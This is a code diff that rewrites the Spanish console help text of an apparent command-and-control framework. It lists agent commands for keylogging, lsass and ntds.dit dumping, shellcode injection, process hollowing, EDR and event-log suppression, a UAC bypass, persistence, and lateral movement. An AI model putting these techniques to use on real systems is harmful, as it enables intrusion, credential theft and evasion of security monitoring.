@@ -5400,19 +5400,20 @@ function addConsoleCommand(cmd) {
 
 function getHelpHTML(isWin) {
   return `<span class="console-section">LOCAL KALI  (!prefix)</span>
-  !<cmd>                             ejecutar en Kali, output aquí mismo
-  !nxc smb <t> -u u -p p            netexec SMB
+  !&lt;cmd&gt;                             ejecutar en Kali, output aquí mismo
+  !nxc smb &lt;t&gt; -u u -p p            netexec SMB
   !certipy-ad find -u u@d -p p ...  ADCS vuln scan
   !bloodhound-python -u u -p p ...  BloodHound collection
   !impacket-secretsdump d/u:p@t      DCSync / SAM dump
   !impacket-GetUserSPNs d/u:p ...    Kerberoasting
-  !impacket-wmiexec d/u:p@t <cmd>   ejecución remota
-  !nmap -sV -p 445,88 <t>           port scan
+  !impacket-wmiexec d/u:p@t &lt;cmd&gt;   ejecución remota
+  !nmap -sV -p 445,88 &lt;t&gt;           port scan
 
 <span class="console-section">AGENTE</span>
   info                               detalles del agente
-  shell &lt;cmd&gt;                       ejecutar comando shell
-  sleep &lt;sec&gt; &lt;jitter%&gt;             cambiar beacon
+  sysinfo                            sysinfo completo (hostname, os, arch, usuario, pid…)
+  shell &lt;cmd&gt;                        ejecutar comando shell
+  sleep &lt;sec&gt; &lt;jitter%&gt;              cambiar beacon
   results [n]                        historial de resultados (defecto 20)
   cleanup                            auto-eliminar del sistema
   back                               cerrar consola
@@ -5427,69 +5428,103 @@ function getHelpHTML(isWin) {
   download &lt;ruta_remota&gt;             agente → servidor
   upload &lt;server_file&gt; &lt;ruta_remota&gt; servidor → agente
 
-<span class="console-section">POST-EXPLOTACIÓN</span>
-  ps                                      listar procesos
-  getpid                                  PID del proceso agente
-  ppid                                    PPID del proceso padre del agente
-  port-scan &lt;target&gt; &lt;ports&gt; [ms]        TCP scan desde el agente (timeout por puerto en ms)
-${isWin ? `  screenshot                              captura → servidor
-  inject &lt;pid&gt; &lt;sc.bin&gt;                  inyección clásica: section map + CreateRemoteThread en proceso existente
-  inject-apc &lt;sc.bin&gt; [proc]             APC early-bird: spawnea [proc] suspendido, inyecta, reanuda (evasivo)
-  forkrun &lt;sc.bin&gt; [proc]                PPID-spoof + section map + thread hijack en proceso sacrificial
-  thread-hijack &lt;pid&gt; &lt;sc.bin&gt;          section map + parchear RIP de thread existente (sin CreateRemoteThread)
-  dotnet-asm &lt;asm.exe&gt; [proc]            .NET → Donut (shellcode) → APC en proceso sacrificial nuevo.
-                                          Ventaja: sin CLR visible. Requiere Donut en el servidor.
-  stage2 &lt;sc.bin&gt;                        in-process CreateThread (sin proc nuevo, bypasa Defender en Server 2022)
-  bof &lt;nombre|archivo.o&gt; [args]          ejecutar BOF (COFF x64); nombre = BOF preinstalado en servidor,
-                                          archivo.o = subido con upload; args = cadena libre separada por espacios
-  dotnet-exec &lt;asm.exe&gt; [args]          CLR inline-execute en-proceso: captura Console.Write, sin Donut ni
-                                          proceso sacrificial. Equivalente a CS execute-assembly / Havoc dotnet
-                                          inline-execute. Soporta Rubeus, Seatbelt, SharpHound, etc.
-  clrstomp &lt;asm.exe&gt; [args_para_asm]    .NET sin Donut, sin proceso nuevo. Carga un assembly legítimo del GAC
-                                          para traer el CLR al proceso actual, luego machaca su memoria con tu
-                                          assembly malicioso. Diferencias vs dotnet-asm:
-                                            • Sin Donut — el agente no convierte a shellcode
-                                            • Sin proceso nuevo — corre dentro del agente (o proceso anfitrión)
-                                            • Sin PE en disco — el header del GAC original queda en memoria
-                                          [args] son los argumentos que recibe tu assembly
-  hook-check                              escanear ntdll/kernel32 en busca de hooks EDR (E9/CC/FF25)
-  hw-bp-check                             detectar hardware breakpoints activos en el thread actual (DR0–DR3)
-  mem-fluctuate start [secs]|stop         XOR-muta periódicamente los buffers internos del agente (shellcode,
-                                          reflective DLL…) para evadir escaneos de memoria de EDRs
-  encode-uuid &lt;sc.bin&gt;                   codifica shellcode como array de UUIDs; genera código C listo para
-                                          compilar que decodifica vía UuidFromStringA (Rpcrt4.dll, sin memcpy)
-  token whoami|steal &lt;pid&gt;|make &lt;u&gt; &lt;p&gt;|drop  gestión de tokens de Windows
-  steal-token &lt;pid&gt;                       impersonar token de un proceso (OpenProcess + DuplicateTokenEx)
-  make-token &lt;dom\\\\user&gt; &lt;pass&gt;         crear token logon con credenciales conocidas
-  rev2self                                revert al token original del proceso
-  keylog start|stop|dump                  keylogger WH_KEYBOARD_LL (hook de teclado a nivel sistema)
-  clip                                    leer portapapeles
-  minidump [pid]                          volcar proceso a .dmp y descargarlo; sin pid → apunta a lsass.exe
-  persist                                 persistencia vía HKCU\\\\Run (Rust agent)
-  persist task [nombre]                   persistencia vía tarea programada onlogon (Rust agent)
-  persist rm                              eliminar persistencia activa (Rust agent)` : ''}
+<span class="console-section">RECONOCIMIENTO</span>
+  ps                                 listar procesos
+  getpid                             PID del proceso agente
+  ppid                               PPID del proceso padre del agente
+  port-scan &lt;target&gt; &lt;ports&gt; [ms]   TCP scan desde el agente (timeout por puerto en ms)
+${isWin ? `
+<span class="console-section">COLECCIÓN</span>
+  screenshot                         captura de pantalla → servidor
+  screenwatch start [secs] / stop    capturas periódicas automáticas (defecto cada 30s)
+  keylog start|stop|dump             keylogger WH_KEYBOARD_LL (hook de teclado a nivel sistema)
+  clip                               leer portapapeles (una vez)
+  clip-monitor start / dump / stop   monitorizar portapapeles continuamente
+  minidump [pid]                     volcar proceso a .dmp y descargarlo; sin pid → lsass.exe
+  ntds-dump [outdir]                 volcar ntds.dit vía ntdsutil (requiere DA)
 
-${isWin ? `<span class="console-section">SHELL INTERACTIVA</span>
+<span class="console-section">INYECCIÓN / EJECUCIÓN</span>
+  inject &lt;pid&gt; &lt;sc.bin&gt;             inyección clásica: WriteProcessMemory + CreateRemoteThread
+  inject-apc &lt;sc.bin&gt; [proc]        APC early-bird: spawnea [proc] suspendido, inyecta, reanuda
+  forkrun &lt;sc.bin&gt; [proc]           PPID-spoof + section map + thread hijack en proceso sacrificial
+  thread-hijack &lt;pid&gt; &lt;sc.bin&gt;     section map + parchear RIP de thread existente (sin CreateRemoteThread)
+  stage2 &lt;sc.bin&gt;                   in-process CreateThread (sin proceso nuevo)
+  hollow &lt;target.exe&gt; &lt;sc.bin&gt;     process hollowing: crea proceso suspendido, reemplaza imagen, reanuda
+  udrl &lt;sc.bin&gt;                     Universal Reflective DLL Loading via phantom load (sin WriteProcessMemory)
+
+<span class="console-section">.NET / BOF</span>
+  dotnet-exec &lt;asm.exe&gt; [args]      CLR inline-execute en-proceso — Rubeus, Seatbelt, SharpHound, etc.
+  dotnet-asm &lt;asm.exe&gt; [proc]       .NET → Donut → APC en proceso sacrificial (sin CLR visible)
+  clrstomp &lt;asm.exe&gt; [args]         .NET sin Donut ni proceso nuevo: sustituye assembly legítimo del GAC
+  bof &lt;nombre|archivo.o&gt; [args]     ejecutar BOF (COFF x64); nombre = preinstalado, archivo.o = subido
+  bof-store load &lt;archivo.o&gt; &lt;nombre&gt;   cargar BOF en store en memoria
+  bof-store list                     listar BOFs en store
+  bof-store unload &lt;nombre&gt;          descargar BOF del store
+
+<span class="console-section">EVASIÓN</span>
+  blockdlls on|off                   política de proceso: bloquear DLLs no firmadas por Microsoft
+  edr-silence &lt;pid&gt;                 bloquear tráfico saliente del EDR vía WFP (Windows Filtering Platform)
+  edr-silence-rm &lt;pid&gt;              eliminar regla WFP para ese proceso
+  eventlog-suspend                   suspender el servicio EventLog (sin generar logs mientras está suspendido)
+  eventlog-resume                    reanudar EventLog
+  peb-spoof &lt;path&gt;                  enmascarar proceso en PEB (ej: C:\\Windows\\System32\\svchost.exe)
+  hook-check                         escanear ntdll/kernel32 en busca de hooks EDR (E9/CC/FF25)
+  hw-bp-check                        detectar hardware breakpoints activos en el thread actual (DR0–DR3)
+  hwbp-clear                         eliminar hardware breakpoints activos (escribir 0 en DR0–DR3)
+  mem-fluctuate start [secs]|stop    XOR-muta periódicamente los buffers internos del agente en memoria
+  encode-uuid &lt;sc.bin&gt;              codifica shellcode como UUIDs; genera código C con UuidFromStringA
+
+<span class="console-section">TOKENS / PRIVESC</span>
+  token whoami                       mostrar token actual del proceso
+  token steal &lt;pid&gt;                 impersonar token de un proceso
+  token make &lt;dom\\user&gt; &lt;pass&gt;    crear token logon con credenciales conocidas
+  token drop                         liberar token impersonado
+  steal-token &lt;pid&gt;                 alias: impersonar token (OpenProcess + DuplicateTokenEx)
+  make-token &lt;dom\\user&gt; &lt;pass&gt;    alias: crear token logon
+  rev2self                           revert al token original del proceso
+  token-store list                   listar tokens almacenados en el store
+  token-store use &lt;id&gt;              aplicar token del store al thread actual
+  elevate fodhelper &lt;cmd&gt;           UAC bypass vía fodhelper.exe (requiere usuario en grupo Admin)
+
+<span class="console-section">PERSISTENCIA</span>
+  persist                            persistencia vía HKCU\\Run
+  persist task [nombre]              persistencia vía tarea programada onlogon
+  persist rm                         eliminar persistencia activa
+  com-hijack &lt;clsid&gt; &lt;dll&gt;         hijacking de clave COM en HKCU (sin elevación)
+  com-hijack rm &lt;clsid&gt;             eliminar hijacking COM
+  gen-lnk &lt;target&gt; [args] [icon&gt;]  generar archivo .lnk (LNK phishing / autorun)
+
+<span class="console-section">MOVIMIENTO LATERAL</span>
+  jump psexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   SMB ADMIN$ + servicio SCM temporal
+  jump smbexec &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   SMBExec (ejecución en memoria, sin binario en disco)
+  jump wmi     &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   ejecución vía WMI Win32_Process::Create
+  jump dcom    &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral vía DCOM MMC20.Application
+  jump atexec  &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   lateral vía schtask efímera (AT)
+  jump ssh     &lt;host&gt; &lt;payload.bin&gt; [user] [pass]   copia + ejecución vía SSH (Linux/Windows)
+  jump winrm   &lt;host&gt; &lt;payload.exe&gt; [user] [pass]   copia payload.exe al target y lo ejecuta vía WinRM
+                                                     (≠ winrm deploy: aquí el payload es un .exe ya subido al servidor)
+  winrm exec   &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cmd&gt;          ejecutar un comando suelto en host remoto vía WinRM
+                                                     (no despliega agente — equivale a wmiexec pero por WinRM)
+  winrm deploy &lt;host&gt; &lt;user&gt; &lt;pass&gt; &lt;cradle_ps&gt;   ejecutar un PowerShell one-liner/cradle en el target vía WinRM
+                                                     (≠ jump winrm: el payload es texto PS, no un .exe; útil para
+                                                     IEX download-and-execute sin subir binario al servidor)
+
+<span class="console-section">SHELL INTERACTIVA</span>
   ishell cmd                         abrir cmd.exe interactivo persistente
   ishell ps                          abrir PowerShell interactivo
   ishell exit                        cerrar shell interactiva
-
-` : ''}<span class="console-section">PIVOT</span>
-  socks5 start &lt;port&gt;                     SOCKS5 proxy en el agente (Rust agent)
-  socks5 stop
-  socks &lt;port&gt; [user:pass]               SOCKS5 proxy en el agente (Go agent)
+` : ''}
+<span class="console-section">PIVOT / TUNNEL</span>
+  socks &lt;port&gt; [user:pass]          SOCKS5 proxy en el agente (Go agent)
   socks stop
-  rsocks start [port] [user:pass]         Reverse SOCKS5: el agente conecta al C2 → útil cuando el agente
-                                          está detrás de NAT y no acepta conexiones entrantes
+  socks5 start &lt;port&gt;               SOCKS5 proxy en el agente (Rust agent)
+  socks5 stop
+  rsocks start [port] [user:pass]   Reverse SOCKS5: el agente conecta al C2 (útil tras NAT)
   rsocks stop
-  portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;   reenvío de puerto: escucha en lport del agente,
-                                                      envía a rhost:rport en la red del objetivo
+  portfwd add [tcp|udp] &lt;lport&gt; &lt;rhost&gt; &lt;rport&gt;  reenvío de puerto local del agente a host:puerto remoto
   portfwd del [tcp|udp] &lt;lport&gt; / portfwd list
-  httpivot start [port] / httpivot stop   servidor HTTP en el agente que enruta tráfico hacia su red interna;
-                                          úsalo con proxychains apuntando a port del agente
-${isWin ? `  link start [pipename] / link stop    conectar a agente hijo vía named pipe SMB (P2P encadenado)
-  winrm exec  &lt;t&gt; &lt;u&gt; &lt;p&gt; &lt;cmd&gt;       ejecutar comando en host remoto vía WinRM (puerto 5985)
-  winrm deploy &lt;t&gt; &lt;u&gt; &lt;p&gt; &lt;cradle&gt;  desplegar agente en host remoto ejecutando cradle PowerShell vía WinRM` : ''}`;
+  httpivot start [port] / httpivot stop  servidor HTTP en el agente para proxychains
+${isWin ? `  link start [pipename] / link stop        conectar a agente hijo vía named pipe SMB (P2P)` : ''}`;
 }
 
 // Per-command detailed help entries (used by `help <cmd>`)
